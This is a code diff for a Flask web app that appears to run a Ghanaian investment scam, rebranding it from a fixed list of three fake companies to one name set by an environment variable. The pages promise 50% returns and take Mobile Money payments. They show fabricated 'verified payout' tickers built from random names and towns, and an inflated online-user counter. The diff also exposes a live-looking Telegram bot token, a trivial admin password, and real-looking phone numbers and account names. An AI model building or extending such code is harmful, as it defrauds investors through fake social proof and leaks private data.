@@ -19,60 +19,45 @@ from flask import (
 from werkzeug.utils import secure_filename
 
 # ==========================================
-# ⚙️ USER CONFIGURATION & MULTI-COMPANY POOL
+# ⚙️ USER CONFIGURATION & ENVIRONMENT BRANDING
 # ==========================================
 ADMIN_PASSWORD = "admin"
 ONLINE_USERS_BASE = 1700
 
 TELEGRAM_BOT_TOKEN = "8986122115:AAEDwqKHTTUgtXiR6lEmIRsZleN1XTxWLWw"
 TELEGRAM_CHAT_ID = "8393567505"
-ADMIN_TELEGRAM_LINK = "https://t.me/zenithsikagh"
 
-# 🟢 MULTI-COMPANY PROFILES CONFIGURATION
-COMPANIES = {
-    "zenith": {
-        "name": "Zenith Easy Cash Ghana",
-        "short": "Zenith",
-        "color": "#028a0f",
-        "secondary_color": "#2e7d32",
-        "momo_number": "0551338991",
-        "momo_name": "EMELIA DOOWELPOUR",
-        "telegram_link": "https://t.me/zenithsikagh"
-    },
-    "alpha": {
-        "name": "Alpha Capital Ghana",
-        "short": "Alpha Capital",
-        "color": "#0369a1",
-        "secondary_color": "#0284c7",
-        "momo_number": "0597436101",
-        "momo_name": "ERIC SHANKUR ARMAH",
-        "telegram_link": "https://t.me/alphacapitalgh"
-    },
-    "prime": {
-        "name": "Prime Liquidity Forex Ghana",
-        "short": "Prime Liquidity",
-        "color": "#b45309",
-        "secondary_color": "#d97706",
-        "momo_number": "0597436102",
-        "momo_name": "ERIC SHANKUR ARMAH",
-        "telegram_link": "https://t.me/primeliquidityghana"
-    }
+# 🏢 DYNAMIC SINGLE COMPANY CONFIGURATION VIA ENVIRONMENT VARIABLE
+# Set COMPANY_NAME in your Render environment variables (e.g., "Albert Corp", "Godwin Capital")
+ENV_COMPANY_NAME = os.environ.get("COMPANY_NAME", "Zenith Easy Cash Ghana")
+
+# Derive a safe ID and short name from the environment variable
+COMPANY_ID = "".join(c for c in ENV_COMPANY_NAME.lower() if c.isalnum() or c == "_") or "zenith"
+COMPANY_SHORT = ENV_COMPANY_NAME.split()[0]
+
+# Dynamic Profile Blueprint based on environment setting
+COMPANY = {
+    "id": COMPANY_ID,
+    "name": ENV_COMPANY_NAME,
+    "short_name": COMPANY_SHORT,
+    "admin_link": f"https://t.me/{COMPANY_ID}gh",
+    "default_momo": "0551338991",
+    "default_momo_name": f"{ENV_COMPANY_NAME.upper()} TRUST",
+    "theme_color": "#028a0f",
+    "gradient": "linear-gradient(135deg, #0b130b, #132e13)",
+    "border_color": "#00ff66"
 }
 
-DEFAULT_COMPANY_KEY = "zenith"
+# Side Ticker Withdrawal Adjustments
+TICKER_INTERVAL_MS = 4500
+MIN_WITHDRAWAL_MULTIPLE = 3
+MAX_WITHDRAWAL_MULTIPLE = 32
+MAX_VISIBLE_ITEMS = 5
 
-# Ticker Withdrawal Adjustments
-ZENITH_TICKER_INTERVAL_MS = 4500  
-ZENITH_MIN_WITHDRAWAL_MULTIPLE = 3  
-ZENITH_MAX_WITHDRAWAL_MULTIPLE = 32  
-ZENITH_MAX_VISIBLE_ITEMS = 5  
+SIDEBAR_WIDTH = "120px"
+SIDEBAR_PADDING = "16px"
+SIDEBAR_MAX_HEIGHT = "80vh"
 
-# SIDEBAR STYLING CONTROLS
-ZENITH_SIDEBAR_WIDTH = "120px"       
-ZENITH_SIDEBAR_PADDING = "16px"      
-ZENITH_SIDEBAR_MAX_HEIGHT = "80vh"   
-
-# TICKER POOL NAMES & TOWNS CONFIGURATION
 GHANA_NAMES_POOL = [
     "Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", 
     "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Nana Ama Owusu", "Fiifi Atta Mills",
@@ -88,7 +73,7 @@ GHANA_TOWNS_POOL = [
 # ==========================================
 
 app = Flask(__name__)
-app.secret_key = "zenith_easy_cash_super_secure_secret_key_change_me"
+app.secret_key = "multi_company_flash_super_secure_secret_key"
 
 DATA_FILE = "Master.json"
 SETTINGS_FILE = "settings.json"
@@ -101,17 +86,11 @@ if not os.path.exists(UPLOAD_FOLDER):
 DEFAULT_AVATAR_SVG = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2394a3b8'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z'/></svg>"
 
 
-def get_active_company():
-  comp_key = session.get("company_key", DEFAULT_COMPANY_KEY)
-  return COMPANIES.get(comp_key, COMPANIES[DEFAULT_COMPANY_KEY])
-
-
-def send_telegram_alert(message, photo_path=None):
+def send_telegram_alert(message, photo_path=None, company_name=COMPANY["name"]):
   if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN" or not TELEGRAM_BOT_TOKEN:
     return
   try:
-    company = get_active_company()
-    full_message = f"🏢 <b>Platform: {company['name']}</b>\n\n{message}"
+    tagged_message = f"🏢 <b>Platform: {company_name}</b>\n\n{message}"
     if photo_path and os.path.exists(photo_path):
       url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
       with open(photo_path, "rb") as photo_file:
@@ -119,7 +98,7 @@ def send_telegram_alert(message, photo_path=None):
             url,
             data={
                 "chat_id": TELEGRAM_CHAT_ID,
-                "caption": full_message,
+                "caption": tagged_message,
                 "parse_mode": "HTML",
             },
             files={"photo": photo_file},
@@ -129,7 +108,7 @@ def send_telegram_alert(message, photo_path=None):
       url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
       payload = {
           "chat_id": TELEGRAM_CHAT_ID,
-          "text": full_message,
+          "text": tagged_message,
           "parse_mode": "HTML",
       }
       requests.post(url, json=payload, timeout=5)
@@ -138,25 +117,35 @@ def send_telegram_alert(message, photo_path=None):
 
 
 def load_settings():
-  company = get_active_company()
   default_settings = {
-      "momo_number": company["momo_number"],
-      "momo_name": company["momo_name"],
+      "momo_number": COMPANY["default_momo"],
+      "momo_name": COMPANY["default_momo_name"],
   }
   if not os.path.exists(SETTINGS_FILE):
     with open(SETTINGS_FILE, "w") as f:
-      json.dump(default_settings, f, indent=4)
+      json.dump({COMPANY["id"]: default_settings}, f, indent=4)
     return default_settings
   try:
     with open(SETTINGS_FILE, "r") as f:
-      return json.load(f)
+      data = json.load(f)
+      if COMPANY["id"] in data:
+        return data[COMPANY["id"]]
+      return default_settings
   except Exception:
     return default_settings
 
 
 def save_settings(settings):
+  all_settings = {}
+  if os.path.exists(SETTINGS_FILE):
+    try:
+      with open(SETTINGS_FILE, "r") as f:
+        all_settings = json.load(f)
+    except Exception:
+      pass
+  all_settings[COMPANY["id"]] = settings
   with open(SETTINGS_FILE, "w") as f:
-    json.dump(settings, f, indent=4)
+    json.dump(all_settings, f, indent=4)
 
 
 def load_investors():
@@ -182,9 +171,10 @@ def save_all_investors(investors):
 def save_investor_data(data):
   investors = load_investors()
   number = data.get("number")
+  company_id = data.get("company_id")
   found_user = False
   for inv in investors:
-    if inv.get("number") == number:
+    if inv.get("number") == number and inv.get("company_id") == company_id:
       inv["password"] = data.get("password", inv.get("password"))
       inv["name"] = data.get("name", inv.get("name"))
       inv["work"] = data.get("work", inv.get("work"))
@@ -202,7 +192,6 @@ def save_investor_data(data):
                 "date_time": inv.get("date_time"),
                 "maturity_date": inv.get("maturity_date", "Pending Approval"),
                 "status": inv.get("status"),
-                "company": inv.get("company", get_active_company()["short"])
             }
         ]
       inv["investments"].append(
@@ -214,14 +203,12 @@ def save_investor_data(data):
               "date_time": data["date_time"],
               "maturity_date": data["maturity_date"],
               "status": data["status"],
-              "company": get_active_company()["short"]
           }
       )
       found_user = True
       break
 
   if not found_user:
-    data["company"] = get_active_company()["short"]
     data["investments"] = [
         {
             "amount": data["amount"],
@@ -231,7 +218,6 @@ def save_investor_data(data):
             "date_time": data["date_time"],
             "maturity_date": data["maturity_date"],
             "status": data["status"],
-            "company": get_active_company()["short"]
         }
     ]
     investors.append(data)
@@ -239,15 +225,15 @@ def save_investor_data(data):
   save_all_investors(investors)
 
 
-ZENITH_ALERTS_TOP_HTML = f"""
+ALERTS_TOP_HTML = """
 <style>
-    #zenithAlertsBanner {{
-        background: linear-gradient(135deg, #0b130b, #132e13);
-        border-bottom: 2px solid #00ff66; color: #fff; padding: 10px 15px;
+    #alertsBanner {{
+        background: {company_gradient};
+        border-bottom: 2px solid {company_border}; color: #fff; padding: 10px 15px;
         margin-bottom: 20px; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         font-family: Arial, sans-serif; overflow: hidden; position: relative;
     }}
-    .alerts-header {{ font-size: 11px; color: #00ff66; font-weight: bold; text-transform: uppercase; margin-bottom: 4px; display: flex; justify-content: space-between; }}
+    .alerts-header {{ font-size: 11px; color: {company_border}; font-weight: bold; text-transform: uppercase; margin-bottom: 4px; display: flex; justify-content: space-between; }}
     .marquee-container {{ overflow: hidden; white-space: nowrap; width: 100%; position: relative; }}
     .marquee-text {{ display: inline-block; padding-left: 100%; animation: marquee 28s linear infinite; font-size: 13px; color: #fff; }}
     .marquee-text b {{ color: #facc15; }}
@@ -255,13 +241,13 @@ ZENITH_ALERTS_TOP_HTML = f"""
     .live-online-counter {{ background: #064e3b; color: #34d399; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 12px; text-align: center; width: 100%; box-sizing: border-box; }}
 </style>
 <div class="live-online-counter" id="liveOnlineCounter">🟢 Loading active investors online...</div>
-<div id="zenithAlertsBanner">
-    <div class="alerts-header"><span>🟢 Live Verified Payouts</span><span>Secure Mobile Money Feed</span></div>
+<div id="alertsBanner">
+    <div class="alerts-header"><span>🟢 Live {company_short_name} Verified Payouts</span><span>Secure Mobile Money Feed</span></div>
     <div class="marquee-container"><div id="alertsText" class="marquee-text">Connecting to secure payout stream...</div></div>
 </div>
 <script>
-    const ghanaNames = {json.dumps(GHANA_NAMES_POOL)};
-    const towns = {json.dumps(GHANA_TOWNS_POOL)};
+    const ghanaNames = {names_json};
+    const towns = {towns_json};
     const roundInvestments = [250, 300, 400, 500, 600, 750, 800, 1000, 1200, 1500, 2000, 2500, 3000, 4000, 5000];
     
     function generateTickerMessages() {{
@@ -309,14 +295,10 @@ HTML_TEMPLATE = """
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; }
-        h2, h3 { color: {{ company.color }}; text-align: center; }
+        h2, h3 { color: {{ company.theme_color }}; text-align: center; }
         
-        .company-switcher-bar { background: #1e293b; padding: 12px; border-radius: 6px; margin-bottom: 20px; text-align: center; color: #fff; display: flex; justify-content: center; align-items: center; gap: 10px; flex-wrap: wrap; }
-        .company-switcher-bar a { background: #334155; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 12px; font-weight: bold; }
-        .company-switcher-bar a.active { background: {{ company.color }}; }
-
-        .process-guide { background: #111827; color: #f8fafc; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid {{ company.color }}; }
-        .process-guide h4 { color: #4ade80; margin-top: 0; margin-bottom: 10px; font-size: 16px; }
+        .process-guide { background: #111827; color: #f8fafc; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid {{ company.theme_color }}; }
+        .process-guide h4 { color: {{ company.border_color }}; margin-top: 0; margin-bottom: 10px; font-size: 16px; }
         .process-steps { margin: 0; padding-left: 18px; font-size: 13px; line-height: 1.7; }
         .process-steps li { margin-bottom: 6px; }
         
@@ -324,16 +306,16 @@ HTML_TEMPLATE = """
         .form-group { margin-bottom: 15px; }
         label { display: block; font-weight: bold; margin-bottom: 5px; }
         input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { background: {{ company.secondary_color }}; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        button:hover { opacity: 0.9; }
+        button { background: {{ company.theme_color }}; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { filter: brightness(0.9); }
         .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
         .nav-links { text-align: center; margin-top: 20px; font-size: 14px; display: flex; justify-content: center; gap: 15px; }
-        .nav-links a { color: {{ company.color }}; text-decoration: none; font-weight: bold; }
+        .nav-links a { color: {{ company.theme_color }}; text-decoration: none; font-weight: bold; }
         .telegram-float-btn { display: block; background: #0088cc; color: white; text-align: center; padding: 10px; border-radius: 4px; margin-top: 15px; text-decoration: none; font-weight: bold; font-size: 14px; }
         
         .password-step-container { display: none; background: #f0fdf4; padding: 15px; border: 1px solid #bbf7d0; border-radius: 6px; margin-bottom: 15px; }
         
-        .tracker-section { background: #f0fdf4; border: 2px solid {{ company.color }}; padding: 25px; border-radius: 8px; margin-top: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .tracker-section { background: #f0fdf4; border: 2px solid {{ company.theme_color }}; padding: 25px; border-radius: 8px; margin-top: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
         .tracker-result-box { margin-top: 20px; background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e1; display: none; }
         .tracker-slot { border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 12px; }
         .tracker-slot:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
@@ -342,14 +324,7 @@ HTML_TEMPLATE = """
 </head>
 <body>
     <div class="container">
-        <div class="company-switcher-bar">
-            <span>🌐 Select Platform Flash:</span>
-            {% for key, comp in companies.items() %}
-                <a href="{{ url_for('set_company', comp_key=key) }}" class="{% if company_key == key %}active{% endif %}">{{ comp.short }}</a>
-            {% endfor %}
-        </div>
-
-        {{ zenith_alerts_top_html|safe }}
+        {{ alerts_banner_html|safe }}
         <h2>{{ company.name }}</h2>
         <h3>Online Investor Registration & Portal</h3>
 
@@ -418,13 +393,14 @@ HTML_TEMPLATE = """
             <button type="submit">Submit Registration & Open Dashboard</button>
         </form>
 
-        <a href="{{ company.telegram_link }}" target="_blank" class="telegram-float-btn">💬 Instant Admin Approval via Telegram</a>
+        <a href="{{ company.admin_link }}" target="_blank" class="telegram-float-btn">💬 Instant Admin Approval via Telegram</a>
         <div class="nav-links">
             <a href="{{ url_for('login') }}">🔑 Investor Login</a>
+            <a href="{{ url_for('admin_login') }}">⚙️ Admin Portal</a>
         </div>
 
         <div class="tracker-section">
-            <h3 style="color: {{ company.color }}; margin-top:0;">🔍 Track Your Investment Live</h3>
+            <h3 style="color: {{ company.theme_color }}; margin-top:0;">🔍 Track Your Investment Live</h3>
             <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered Phone Number below to check your live status.</p>
             <div class="form-group">
                 <label style="font-size: 13px;">Registered Phone Number:</label>
@@ -435,7 +411,7 @@ HTML_TEMPLATE = """
                     <input type="password" id="trackPasswordInput" placeholder="Enter password" style="margin-bottom: 8px;">
                 </div>
 
-                <button type="button" onclick="trackInvestment()" style="background: {{ company.color }}; padding: 10px; margin-top: 5px;">Check Status Now</button>
+                <button type="button" onclick="trackInvestment()" style="background: {{ company.theme_color }}; padding: 10px; margin-top: 5px;">Check Status Now</button>
             </div>
             <div id="trackerResultBox" class="tracker-result-box">
                 <div id="trackerContent">Searching...</div>
@@ -504,12 +480,12 @@ HTML_TEMPLATE = """
                 const data = await response.json();
 
                 if (data.success) {
-                    let html = `<b style="color:{{ company.color }};">Investor: ${data.name}</b><hr style="border:0; border-top:1px solid #eee; margin:8px 0;">`;
+                    let html = `<b style="color:{{ company.theme_color }};">Investor: ${data.name}</b><hr style="border:0; border-top:1px solid #eee; margin:8px 0;">`;
                     data.investments.forEach((inv, idx) => {
                         html += `
                             <div class="tracker-slot">
-                                <p style="margin:4px 0;"><b>Slot #${idx + 1}</b> - Capital: <b>GHs ${inv.amount.toLocaleString()}</b> (${inv.company || 'Platform'})</p>
-                                <p style="margin:4px 0; color:{{ company.color }}; font-size:12px;">Expected Return (50%): GHs ${inv.expected_return.toLocaleString()}</p>
+                                <p style="margin:4px 0;"><b>Slot #${idx + 1}</b> - Capital: <b>GHs ${inv.amount.toLocaleString()}</b></p>
+                                <p style="margin:4px 0; color:{{ company.theme_color }}; font-size:12px;">Expected Return (50%): GHs ${inv.expected_return.toLocaleString()}</p>
                                 <p style="margin:4px 0; font-size:12px;">Maturity Date: <b>${inv.maturity_date}</b></p>
                                 <p style="margin:4px 0; font-size:12px;">Status: <span style="font-weight:bold; color:#b45309;">${inv.status}</span></p>
                             </div>
@@ -538,19 +514,20 @@ INVESTOR_LOGIN_TEMPLATE = """
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h2 { color: {{ company.color }}; text-align: center; }
+        h2 { color: {{ company.theme_color }}; text-align: center; }
         .form-group { margin-bottom: 15px; }
         label { display: block; font-weight: bold; margin-bottom: 5px; }
         input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { background: {{ company.secondary_color }}; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button { background: {{ company.theme_color }}; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { filter: brightness(0.9); }
         .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
         .back { text-align: center; margin-top: 15px; }
-        .back a { color: {{ company.color }}; text-decoration: none; font-weight: bold; font-size: 14px; }
+        .back a { color: {{ company.theme_color }}; text-decoration: none; font-weight: bold; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>{{ company.short }} Portal Login</h2>
+        <h2>{{ company.short_name }} Portal Login</h2>
         {% with messages = get_flashed_messages() %}
           {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
         {% endwith %}
@@ -585,15 +562,15 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         .dashboard-container { flex: 2.3; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         
         .sidebar-ticker { 
-            width: {{ zenith_sidebar_width }}; 
+            width: {{ sidebar_width }}; 
             flex-shrink: 0;
             background: #111827; 
             color: #ffffff; 
-            padding: {{ zenith_sidebar_padding }}; 
+            padding: {{ sidebar_padding }}; 
             border-radius: 8px; 
             position: sticky; 
             top: 20px; 
-            max-height: {{ zenith_sidebar_max_height }}; 
+            max-height: {{ sidebar_max_height }}; 
             overflow-y: auto;
             border: 1px solid #1f2937;
             box-shadow: 0 4px 15px rgba(0,0,0,0.25);
@@ -637,22 +614,22 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             100% { transform: scale(0.9); opacity: 0.5; }
         }
         
-        h2 { color: {{ company.color }}; margin-top: 0; }
+        h2 { color: {{ company.theme_color }}; margin-top: 0; }
         .logout { float: right; }
         .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
         .home-link-top { margin-bottom: 15px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
-        .home-link-top a { color: {{ company.color }}; text-decoration: none; font-weight: bold; }
-        .profile-btn-link { background: {{ company.color }}; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
-        .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid {{ company.secondary_color }}; line-height: 1.6; }
+        .home-link-top a { color: {{ company.theme_color }}; text-decoration: none; font-weight: bold; }
+        .profile-btn-link { background: {{ company.theme_color }}; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
+        .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid {{ company.theme_color }}; line-height: 1.6; }
         
         .balance-cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
         .balance-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 6px; text-align: center; }
-        .balance-card.current { border-left: 4px solid {{ company.color }}; background: #f0fdf4; }
+        .balance-card.current { border-left: 4px solid {{ company.theme_color }}; background: #f0fdf4; }
         .balance-card.pending { border-left: 4px solid #d97706; background: #fffbeb; }
         .balance-card h4 { margin: 0 0 5px 0; font-size: 12px; color: #64748b; text-transform: uppercase; }
         .balance-card .amount { font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }
 
-        .btn-withdraw { background: {{ company.color }}; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
+        .btn-withdraw { background: {{ company.theme_color }}; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
         .btn-topup-toggle { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }
         .topup-dropdown { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }
         .loading-badge { display: inline-flex; align-items: center; gap: 8px; background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }
@@ -730,11 +707,11 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             {% if investments %}
                 {% for inv in investments %}
                 <div class="card">
-                    <p style="margin-top:0;"><strong>Investment Slot #{{ loop.index }}</strong> <span style="font-size:11px; background:#e2e8f0; padding:2px 6px; border-radius:4px;">Platform: {{ inv.company }}</span></p>
-                    <p><strong>Capital Invested:</strong> GHs {{ "%.2f"|format(inv.amount) }} <span style="color:{{ company.color }}; font-size:12px;">(+50% Expected Payout: GHs {{ "%.2f"|format(inv.expected_return) }})</span></p>
+                    <p style="margin-top:0;"><strong>Investment Slot #{{ loop.index }}</strong></p>
+                    <p><strong>Capital Invested:</strong> GHs {{ "%.2f"|format(inv.amount) }} <span style="color:{{ company.theme_color }}; font-size:12px;">(+50% Expected Payout: GHs {{ "%.2f"|format(inv.expected_return) }})</span></p>
                     <p><strong>Payment Proof / ID:</strong> {{ inv.transaction_id }}</p>
                     <p><strong>Registered On:</strong> {{ inv.date_time }}</p>
-                    <p><strong>Maturity Target Date:</strong> <span style="color: {{ company.color }}; font-weight: bold;">{{ inv.maturity_date }}</span></p>
+                    <p><strong>Maturity Target Date:</strong> <span style="color: {{ company.theme_color }}; font-weight: bold;">{{ inv.maturity_date }}</span></p>
                     
                     <p><strong>Live Tracker:</strong>
                         <div class="countdown-live-box" data-maturity="{{ inv.maturity_date }}" id="tracker_{{ loop.index0 }}">
@@ -778,7 +755,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                         <input type="text" name="topup_proof" placeholder="MoMo Transaction ID" style="padding:8px; margin-bottom:8px; font-size:12px; width:100%; box-sizing:border-box;">
                         <label style="font-size:11px; color:#555;">Upload Screenshot Receipt:</label>
                         <input type="file" name="topup_screenshot" accept="image/*" style="font-size:11px; margin-bottom:8px;">
-                        <button type="submit" style="background:{{ company.secondary_color }}; color:white; border:none; padding:10px; width:100%; font-weight:bold; border-radius:4px; cursor:pointer;">Submit Top-Up for Confirmation</button>
+                        <button type="submit" style="background:#2e7d32; color:white; border:none; padding:10px; width:100%; font-weight:bold; border-radius:4px; cursor:pointer;">Submit Top-Up for Confirmation</button>
                     </form>
                     {% endif %}
 
@@ -795,17 +772,17 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         <div class="sidebar-ticker">
             <div class="sidebar-sticky-header">
                 <div class="gps-online-tag"><span class="gps-dot"></span> Live Tracking</div>
-                <h3 style="color: #4ade80; font-size: 14px; margin: 0; text-transform: uppercase; letter-spacing: 0.5px;">Live Withdrawals</h3>
+                <h3 style="color: #4ade80; font-size: 14px; margin: 0; text-transform: uppercase; letter-spacing: 0.5px;">{{ company.short_name }} Withdrawals</h3>
             </div>
             <div id="sideTickerList" style="margin-top: 8px;"></div>
         </div>
     </div>
 
     <script>
-        const tickerIntervalMs = {{ zenith_ticker_interval_ms }};
-        const minMultiplier = {{ zenith_min_withdrawal_multiple }};
-        const maxMultiplier = {{ zenith_max_withdrawal_multiple }};
-        const maxVisibleItems = {{ zenith_max_visible_items }};
+        const tickerIntervalMs = {{ ticker_interval_ms }};
+        const minMultiplier = {{ min_multiplier }};
+        const maxMultiplier = {{ max_multiplier }};
+        const maxVisibleItems = {{ max_visible_items }};
 
         function toggleTopup(idx) {
             const box = document.getElementById('topupBox_' + idx);
@@ -854,8 +831,8 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         updateTrackers();
         updateWithdrawalCountdowns();
 
-        const sideNames = {json.dumps(GHANA_NAMES_POOL)};
-        const sideTowns = {json.dumps(GHANA_TOWNS_POOL)};
+        const sideNames = {{ names_json|safe }};
+        const sideTowns = {{ towns_json|safe }};
         
         function addSideTickerItem() {
             const list = document.getElementById('sideTickerList');
@@ -901,15 +878,15 @@ INVESTOR_PROFILE_TEMPLATE = """
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 550px; background: #fff; padding: 30px; margin: 40px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h2 { color: {{ company.color }}; text-align: center; margin-top: 0; }
+        h2 { color: {{ company.theme_color }}; text-align: center; margin-top: 0; }
         .back-link { margin-bottom: 20px; font-size: 14px; }
-        .back-link a { color: {{ company.color }}; text-decoration: none; font-weight: bold; }
-        .profile-avatar-large { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid {{ company.secondary_color }}; display: block; margin: 0 auto 15px auto; background: #e2e8f0; }
+        .back-link a { color: {{ company.theme_color }}; text-decoration: none; font-weight: bold; }
+        .profile-avatar-large { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid {{ company.theme_color }}; display: block; margin: 0 auto 15px auto; background: #e2e8f0; }
         .form-group { margin-bottom: 15px; }
         label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 13px; }
         input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { background: {{ company.secondary_color }}; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        button:hover { opacity: 0.9; }
+        button { background: {{ company.theme_color }}; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { filter: brightness(0.9); }
         .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
     </style>
 </head>
@@ -928,7 +905,7 @@ INVESTOR_PROFILE_TEMPLATE = """
             {% else %}
                 <img src="{{ default_avatar_svg }}" class="profile-avatar-large">
             {% endif %}
-            <p style="margin: 0; font-size: 14px; color: #64748b;">Default Human Head Avatar Active (Change below anytime)</p>
+            <p style="margin: 0; font-size: 14px; color: #64748b;">Default Human Head Avatar Active</p>
         </div>
 
         <form action="{{ url_for('update_profile') }}" method="POST" enctype="multipart/form-data">
@@ -963,24 +940,25 @@ ADMIN_LOGIN_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8"><title>Admin Login</title>
+    <meta charset="UTF-8"><title>Admin Login - {{ company.name }}</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h2 { color: #028a0f; text-align: center; }
+        h2 { color: {{ company.theme_color }}; text-align: center; }
         .form-group { margin-bottom: 15px; }
         label { display: block; font-weight: bold; margin-bottom: 5px; }
         input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button { background: {{ company.theme_color }}; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Admin Authentication</h2>
+        <h2>{{ company.short_name }} Admin Authentication</h2>
         <form method="POST">
             <div class="form-group"><label>Admin Password:</label><input type="password" name="password" required></div>
             <button type="submit">Login</button>
         </form>
+        <div style="text-align:center; margin-top:15px;"><a href="{{ url_for('index') }}" style="color:{{ company.theme_color }}; text-decoration:none; font-weight:bold; font-size:14px;">← Back to Home</a></div>
     </div>
 </body>
 </html>
@@ -990,18 +968,18 @@ ADMIN_DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
